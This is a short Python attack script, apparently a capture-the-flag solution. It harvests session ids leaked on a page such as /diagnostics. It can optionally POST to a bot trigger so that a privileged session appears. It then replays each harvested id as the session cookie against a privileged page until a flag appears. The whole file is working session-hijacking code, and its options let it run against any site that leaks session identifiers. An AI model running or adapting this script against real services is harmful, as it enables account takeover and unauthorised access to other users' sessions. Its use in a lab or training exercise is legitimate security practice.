#!/usr/bin/env python3
"""Harvest session ids leaked on a page (debug/log/diagnostics) and replay
each one as the session cookie against a privileged page.

    python session_swap.py http://auth14.chal.deti:8073 --source /diagnostics \
        --regex '[0-9a-f]{32}' --cookie sid --check /dashboard --trigger /bot/manager-shift-report
"""
import argparse
import re

import requests

FLAG = re.compile(r"flag\{[^}]+\}")


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("url")
    ap.add_argument("--source", required=True, help="path that leaks session ids")
    ap.add_argument("--regex", default=r"[0-9a-f]{32}")
    ap.add_argument("--cookie", default="sid")
    ap.add_argument("--check", required=True)
    ap.add_argument("--trigger", help="path to POST first (makes a privileged session appear)")
    a = ap.parse_args()
    base = a.url.rstrip("/")
    me = requests.Session()
    me.get(base + a.check, timeout=10)
    mine = me.cookies.get(a.cookie)
    if a.trigger:
        print(f"[trigger] {me.post(base + a.trigger, timeout=20).status_code}")
    page = me.get(base + a.source, timeout=10).text
    sids = list(dict.fromkeys(re.findall(a.regex, page)))
    print(f"[i] my sid={mine}; leaked: {len(sids)}")
    for sid in reversed(sids):
        if sid == mine:
            continue
        r = requests.get(base + a.check, cookies={a.cookie: sid}, timeout=10)
        fl = FLAG.findall(r.text)
        print(f"{sid} -> {r.status_code} {len(r.content)} {'FLAG ' + fl[0] if fl else ''}")
        if fl:
            return


if __name__ == "__main__":
    main()
